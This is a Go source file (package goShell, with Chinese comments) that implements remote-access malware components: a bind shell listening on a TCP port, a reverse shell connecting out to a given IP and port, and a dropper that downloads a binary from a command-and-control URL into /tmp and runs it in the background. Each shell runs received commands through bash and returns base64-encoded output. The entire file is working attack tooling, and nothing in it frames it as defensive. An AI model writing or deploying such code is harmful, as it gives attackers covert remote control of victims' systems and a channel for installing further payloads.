package goShell

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os/exec"
	"path/filepath"
	"strings"
)

// OpenShell 本地开放端口 直连shell
func OpenShell(prot string) {
	openPort, err := net.Listen("tcp", prot)
	if err != nil {
		panic(err)
		return
	}
	defer openPort.Close()

	fmt.Println("open port:", prot)

	for {
		// 处理每一个连接
		conn, err := openPort.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue // 发生错误时继续监听
		}

		go handleConnection(conn) // go 处理连接
	}
}

// handleConnection 不直接调用 处理直连shell的命令
func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)

	for {
		message, err := reader.ReadString('\n') // 读取直到换行符
		if err != nil {
			fmt.Println("Read error:", err)
			return
		}

		message = strings.TrimSpace(message)
		output, err := exec.Command("bash", "-c", message).Output()
		if err != nil {
			fmt.Println("Command execution error:", err)
			return
		}

		encoded := base64.StdEncoding.EncodeToString(output)

		// 发送编码后的数据（添加换行符作为消息分隔符）
		_, err = conn.Write([]byte(encoded + "\n"))

		if err != nil {
			fmt.Println("Write error:", err)
			return
		}
	}
}

// reShell 反弹shell
func reShell(ip string, port string) {
	reIp := ip + ":" + port
	conn, err := net.Dial("tcp", reIp)
	if err != nil {
		fmt.Println("Connection error:", err)
		return
	}
	defer conn.Close()
	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n') // 读取直到换行符
		if err != nil {
			fmt.Println("Read error:", err)
			return
		}
		message = strings.TrimSpace(message)

		output, err := exec.Command("bash", "-c", message).Output()
		if err != nil {
			fmt.Println("Command execution error:", err)
			return
		}
		encoded := base64.StdEncoding.EncodeToString(output) //编码执行结果

		// 发送编码后的数据（添加换行符作为消息分隔符）
		_, err = conn.Write([]byte(encoded + "\n"))
		if err != nil {
			fmt.Println("Write error:", err)
			return
		}

	}
}

// downloadShell
func downloadShell(ccUrl string) {
	resp, err := http.Get(ccUrl)
	if err != nil {
		fmt.Println("Download error:", err)
	}
	defer resp.Body.Close()

	elfData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Read error:", err)
		return
	}

	tmpDir := "/tmp"
	elfFileName := filepath.Join(tmpDir, "tmp114514")
	if err := ioutil.WriteFile(elfFileName, elfData, 0755); err != nil {
		fmt.Printf("Failed to write ELF file to temporary folder: %v\n", err)
		return
	}

	cmd := exec.Command("sh", "-c", string(elfFileName)+"&")
	if err := cmd.Run(); err != nil {
		fmt.Println("elfRunERR:", err)
	}
}
